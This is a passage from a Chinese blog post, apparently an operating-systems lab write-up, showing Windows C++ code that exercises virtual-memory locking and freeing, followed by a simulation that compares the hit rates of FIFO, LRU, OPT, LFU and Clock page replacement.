上锁出错</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 上锁出错: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; A区域上锁成功\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;试图释放内存A.\n&quot;</span>);</span><br><span class="line">    flag = <span class="built_in">VirtualFree</span>(pS[<span class="number">0</span>], ONEM, MEM_RELEASE);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 释放内存A失败: A已被上锁.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 释放内存A成功.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解锁内存A.\n&quot;</span>);</span><br><span class="line">    flag = <span class="built_in">VirtualUnlock</span>(pS[<span class="number">0</span>], ONEM);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;  <span class="comment">// 解锁出错</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 解锁出错: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 解锁A成功.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;试图释放内存A.\n&quot;</span>);</span><br><span class="line">    flag = <span class="built_in">VirtualFree</span>(pS[<span class="number">0</span>], <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 释放内存A失败: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 释放内存A成功.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printMem</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// B - PAGE_NOACCESS</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;试图对虚拟内存B上锁.\n&quot;</span>);</span><br><span class="line">    flag = <span class="built_in">VirtualLock</span>(pS[<span class="number">1</span>], ONEM);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;  <span class="comment">// 上锁出错</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; B上锁出错: PAGE_NOACCESS不可被访问.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; B区域上锁成功.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;试图释放内存区B.\n&quot;</span>);</span><br><span class="line">    flag = <span class="built_in">VirtualFree</span>(pS[<span class="number">1</span>], <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 释放失败.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 释放成功.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printMem</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// C - PAGE_NOCACHE</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;试图访问并释放内存C.\n&quot;</span>);</span><br><span class="line">    flag = <span class="built_in">VirtualFree</span>(pS[<span class="number">2</span>], <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 释放失败: PAGE_NOCACHE下空间地址未被返回\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 释放成功.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printMem</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// D - MEM_RESET</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;试图访问并回收内存D.\n&quot;</span>);</span><br><span class="line">    flag = <span class="built_in">VirtualFree</span>(pS[<span class="number">3</span>], ONEM, MEM_DECOMMIT);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 回收失败: MEM_RESET下区域未被保留\n&quot;</span>);</span><br><span class="line">        <span class="comment">// exit(-1);</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 回收成功.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printMem</span>();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// E - MEM_TOP_DOWN</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;试图访问并释放内存E.\n&quot;</span>);</span><br><span class="line">    flag = <span class="built_in">VirtualFree</span>(pS[<span class="number">4</span>], <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 释放失败: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 释放成功.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printMem</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;试图回收内存E.\n&quot;</span>);</span><br><span class="line">    flag = <span class="built_in">VirtualFree</span>(pS[<span class="number">4</span>], ONEM, MEM_DECOMMIT);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 回收失败: E已被释放\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 回收成功.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">trace</span><span class="params">(LPVOID)</span></span>&#123;</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS);   </span><br><span class="line">    <span class="built_in">printSys</span>();         <span class="comment">// 输出系统信息 </span></span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS); </span><br><span class="line">    <span class="built_in">printMem</span>();         <span class="comment">// 输出内存信息A1</span></span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS); </span><br><span class="line">    <span class="built_in">printMem</span>();         <span class="comment">// 输出内存信息A2</span></span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS); </span><br><span class="line">    <span class="built_in">printMem</span>();         <span class="comment">// 输出内存信息A3</span></span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS); </span><br><span class="line">    <span class="built_in">printMem</span>();         <span class="comment">// 输出内存信息B1</span></span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS); </span><br><span class="line">    <span class="built_in">printMem</span>();         <span class="comment">// 输出内存信息C1</span></span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS); </span><br><span class="line">    <span class="built_in">printMem</span>();         <span class="comment">// 输出内存信息D1</span></span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS); </span><br><span class="line">    <span class="built_in">printMem</span>();         <span class="comment">// 输出内存信息E1</span></span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LPMEMSTATUS-&gt;dwLength = <span class="built_in">sizeof</span>(MEMSTATUS);</span><br><span class="line">    <span class="built_in">InitializeCriticalSection</span>(&amp;CS);     <span class="comment">// 初始化临界区</span></span><br><span class="line">    trd1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, trace, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    trd2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, alloc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(trd1, INFINITE);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(trd2, INFINITE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(trd1);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(trd2);</span><br><span class="line">    <span class="built_in">DeleteCriticalSection</span>(&amp;CS);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="换页算法模拟"><a href="#换页算法模拟" class="headerlink" title="换页算法模拟"></a>换页算法模拟</h2><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://blog.csdn.net/qq_21539375/article/details/122128445" >C++优先队列自定义比较函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><p>“论面向对象思想”，参考了同学的代码大有收获。实现了五种换页算法：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALL 320</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pMem</span>&#123;    <span class="comment">// 物理内存</span></span><br><span class="line">    <span class="type">size_t</span> vIndex;  <span class="comment">// size_t————下标的标准类型————虚拟页码</span></span><br><span class="line">    <span class="type">clock_t</span> lAT;     <span class="comment">// 最近访问时间————LRU: 最近最久未使用</span></span><br><span class="line">    <span class="type">clock_t</span> fAT;     <span class="comment">// 首次访问时间————FIFO: 先进先出</span></span><br><span class="line">    <span class="type">int</span> aT;     <span class="comment">// 访问次数————LFU: 最少使用</span></span><br><span class="line">    <span class="type">int</span> dis;        <span class="comment">// 下次访问的距离, 超过ALL为不再出现————OPT: 最佳淘汰</span></span><br><span class="line">    <span class="type">int</span> ord;        <span class="comment">// 访问次序————Clock</span></span><br><span class="line">    <span class="built_in">pMem</span>(<span class="type">size_t</span> idx, <span class="type">int</span> _dis, <span class="type">int</span> _ord):<span class="built_in">aT</span>(<span class="number">1</span>), <span class="built_in">vIndex</span>(idx), <span class="built_in">dis</span>(_dis), <span class="built_in">ord</span>(_ord)&#123;</span><br><span class="line">        lAT = <span class="built_in">clock</span>();</span><br><span class="line">        fAT = lAT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vMemManager</span>&#123;  <span class="comment">// 虚拟内存管理——换页模拟</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">const</span> <span class="type">int</span> metaPages = <span class="number">10</span>;   <span class="comment">// 每页10条指令</span></span><br><span class="line">        <span class="type">const</span> <span class="type">int</span> vPages = <span class="number">32</span>;      <span class="comment">// 虚拟页数32</span></span><br><span class="line">        <span class="type">int</span> pPages;             <span class="comment">// 物理内存页数</span></span><br><span class="line">        <span class="type">int</span> acs;        <span class="comment">// 访问次数</span></span><br><span class="line">        <span class="type">int</span> mis;        <span class="comment">// 未命中次数</span></span><br><span class="line">        <span class="type">int</span> curOrd;     <span class="comment">// 出局位序指针</span></span><br><span class="line">        <span class="type">int</span> opId;       <span class="comment">// 指令指针</span></span><br><span class="line">        vector&lt;pMem&gt; pM;</span><br><span class="line">        function&lt;<span class="type">bool</span>(pMem&amp; a, pMem&amp; b)&gt; cmp;   <span class="comment">// 动态赋予的静态函数成员-&gt;函数对象地址</span></span><br><span class="line">        <span class="comment">// priority_queue&lt;pMem*, vector&lt;pMem*&gt;, decltype(cmp)&gt; pvPages;  // 放入物理内存中的虚拟页</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">static</span> vector&lt;<span class="type">int</span>&gt; opSet;   <span class="comment">// 静态指令集</span></span><br><span class="line">        <span class="built_in">vMemManager</span>(<span class="type">int</span> ps,</span><br><span class="line">            function&lt;<span class="built_in">bool</span>(pMem&amp;, pMem&amp;)&gt; _cmp</span><br><span class="line">        ):<span class="built_in">pPages</span>(ps), <span class="built_in">cmp</span>(_cmp), <span class="built_in">acs</span>(<span class="number">0</span>), <span class="built_in">mis</span>(<span class="number">0</span>), <span class="built_in">opId</span>(<span class="number">0</span>), <span class="built_in">curOrd</span>(<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// pM.resize(0);    // resize会调用模板类的空构造函数，若不存在会报错</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getPage</span><span class="params">(<span class="type">int</span> op)</span></span>&#123;    <span class="comment">// 指令的在虚存中的页码</span></span><br><span class="line">            <span class="keyword">return</span> op/metaPages;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getDis</span><span class="params">(<span class="type">int</span> idx)</span></span>&#123;    <span class="comment">// 距离下次访问</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=opId; i&lt;ALL; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">getPage</span>(opSet[i]) == idx)&#123;</span><br><span class="line">                    <span class="keyword">return</span> i-opId;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ALL*<span class="number">2</span>-opId;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">newOrd</span><span class="params">(<span class="type">int</span> n=<span class="number">-1</span>)</span></span>&#123;       <span class="comment">// 新添出局位序————标记相当于后移一轮，由于本身就要后移一轮，因此变成两轮</span></span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">-1</span>) <span class="keyword">return</span> curOrd++;  <span class="comment">// 非置换</span></span><br><span class="line">            curOrd = n+<span class="number">1</span>;   <span class="comment">// 置换</span></span><br><span class="line">            <span class="keyword">return</span> n+<span class="number">2</span>*pPages;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">updateOrd</span><span class="params">(vector&lt;pMem&gt;::iterator _pm)</span></span>&#123;    <span class="comment">//  命中————两轮内的（不包括两轮）可以后移一轮</span></span><br><span class="line">            <span class="keyword">if</span>((_pm-&gt;ord - curOrd) &lt; pPages)&#123;</span><br><span class="line">                _pm-&gt;ord += pPages;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">updateDis</span><span class="params">()</span></span>&#123;   <span class="comment">// 更新距离</span></span><br><span class="line">            <span class="keyword">for</span>(pMem&amp; v : pM)&#123;   <span class="comment">// 迭代更新物理内存中的虚拟页统计</span></span><br><span class="line">                v.dis = <span class="built_in">getDis</span>(v.vIndex);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">nextOp</span><span class="params">()</span></span>&#123;     <span class="comment">// 访问下一指令</span></span><br><span class="line">            acs++;      <span class="comment">// 访问次数增加</span></span><br><span class="line">            <span class="type">int</span> vId = opSet[opId++];</span><br><span class="line">            <span class="type">int</span> tmpP = <span class="built_in">getPage</span>(vId);    <span class="comment">// 获取虚拟页</span></span><br><span class="line">            vector&lt;pMem&gt;::iterator pIt = <span class="built_in">find_if</span>(</span><br><span class="line">                pM.<span class="built_in">begin</span>(), pM.<span class="built_in">end</span>(),</span><br><span class="line">                [tmpP](pMem&amp; _pm)&#123;  <span class="comment">// 虚拟页码对应</span></span><br><span class="line">                    <span class="keyword">return</span> _pm.vIndex == tmpP;</span><br><span class="line">                &#125;</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span>(pIt == pM.<span class="built_in">end</span>())&#123;    <span class="comment">// 不在内存中</span></span><br><span class="line">                mis++;</span><br><span class="line">                <span class="keyword">if</span>(pM.<span class="built_in">size</span>() &lt; pPages)&#123;</span><br><span class="line">                    pM.<span class="built_in">push_back</span>(<span class="built_in">pMem</span>(tmpP, <span class="built_in">getDis</span>(tmpP), <span class="built_in">newOrd</span>()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 置换</span></span><br><span class="line">                    pMem &amp;pm = pM.<span class="built_in">front</span>();</span><br><span class="line">                    pm = <span class="built_in">pMem</span>(tmpP, <span class="built_in">getDis</span>(tmpP), <span class="built_in">newOrd</span>(pm.ord));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 命中</span></span><br><span class="line">                pIt-&gt;aT++;</span><br><span class="line">                <span class="comment">// pIt-&gt;dis=getDis(pIt-&gt;vIndex);</span></span><br><span class="line">                pIt-&gt;lAT=<span class="built_in">clock</span>();</span><br><span class="line">                <span class="built_in">updateOrd</span>(pIt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">updateDis</span>();</span><br><span class="line">            <span class="built_in">sort</span>(pM.<span class="built_in">begin</span>(), pM.<span class="built_in">end</span>(), cmp);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">double</span> <span class="title">tick</span><span class="params">()</span></span>&#123;    <span class="comment">// 模拟换页触发, 返回命中率</span></span><br><span class="line">            <span class="keyword">while</span>(acs&lt;ALL)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;<span class="built_in">nextOp</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>-<span class="built_in">double</span>(mis)/acs;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">randNum</span><span class="params">(<span class="type">int</span> n1, <span class="type">int</span> n2 = <span class="number">-1</span>)</span></span>&#123;    <span class="comment">// [n1, n2) [0, 0) =&gt; [0, 320) [319, 320) =&gt; [0, 320)</span></span><br><span class="line">    <span class="keyword">if</span>(n2 == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n1 == <span class="number">0</span>) n1 = ALL;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">rand</span>()%n1;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(n1 == <span class="number">319</span>) n1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">rand</span>()%(n2-n1)+n1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">nextMid</span><span class="params">(<span class="type">int</span> m)</span></span>&#123;     <span class="comment">// 迭代指令 [0, 319]</span></span><br><span class="line">    <span class="keyword">return</span> (m+<span class="number">1</span>)%ALL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt;&amp; <span class="title">randOperation</span><span class="params">()</span></span>&#123;   <span class="comment">// 生成随机指令序列</span></span><br><span class="line">    <span class="type">static</span> vector&lt;<span class="type">int</span>&gt; p;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));     <span class="comment">// 初始化</span></span><br><span class="line">    p.<span class="built_in">resize</span>(<span class="number">320</span>);</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>, mid = <span class="number">0</span>;     <span class="comment">// 随机取一条指令</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">80</span>; i++)&#123;</span><br><span class="line">        mid = <span class="built_in">randNum</span>(mid);</span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 随机前地址</span></span><br><span class="line">        mid = <span class="built_in">nextMid</span>(mid);</span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 顺序</span></span><br><span class="line">        mid = <span class="built_in">randNum</span>(mid, ALL);</span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 随机后地址</span></span><br><span class="line">        mid = <span class="built_in">nextMid</span>(mid);     </span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 顺序</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; vMemManager::opSet = <span class="built_in">randOperation</span>();   <span class="comment">// 初始化指令集</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> fifo = [](pMem&amp; a, pMem&amp; b)&#123;     <span class="comment">// 先进先出</span></span><br><span class="line">    <span class="keyword">return</span> a.fAT&lt;b.fAT; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> lru = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.lAT==b.lAT?a.fAT&lt;b.fAT:a.lAT&lt;b.lAT;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> opt = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.dis==b.dis?a.fAT&lt;b.fAT:a.dis&gt;b.dis;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> lfu = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.aT==b.aT?a.fAT&lt;b.fAT:a.aT&lt;b.aT;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> clock_vp = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.ord==b.ord?a.fAT&lt;b.fAT:a.ord&lt;b.ord;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\tFIFO\tLRU\tOPT\tLFU\tClock&quot;</span>);   <span class="comment">// field</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">4</span>; i&lt;<span class="number">33</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%d\t&quot;</span>, i);</span><br><span class="line">        vector&lt;vMemManager&gt; vmSet;</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, fifo));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, lru));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, opt));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, lfu));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, clock_vp));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">5</span>; j++)&#123;</span><br><span class="line">            <span class="type">double</span> hit = vmSet[j].<span class="built_in">tick</span>();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%.2f\%\t&quot;</span>, hit);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>参考代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALL 320</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pMem</span>&#123;    <span class="comment">// 物理内存</span></span><br><span class="line">    <span class="type">size_t</span> vIndex;  <span class="comment">// size_t————下标的标准类型————虚拟页码</span></span><br><span class="line">    <span class="type">clock_t</span> lAT;     <span class="comment">// 最近访问时间————LRU: 最近最久未使用</span></span><br><span class="line">    <span class="type">clock_t</span> fAT;     <span class="comment">// 首次访问时间————FIFO: 先进先出</span></span><br><span class="line">    <span class="type">int</span> aT;     <span class="comment">// 访问次数————LFU: 最少使用</span></span><br><span class="line">    <span class="type">int</span> dis;        <span class="comment">// 下次访问的距离, 超过ALL为不再出现————OPT: 最佳淘汰</span></span><br><span class="line">    <span class="type">int</span> ord;        <span class="comment">// 访问次序————Clock</span></span><br><span class="line">    <span class="built_in">pMem</span>(<span class="type">size_t</span> idx, <span class="type">int</span> _dis, <span class="type">int</span> _ord):<span class="built_in">aT</span>(<span class="number">1</span>), <span class="built_in">vIndex</span>(idx), <span class="built_in">dis</span>(_dis), <span 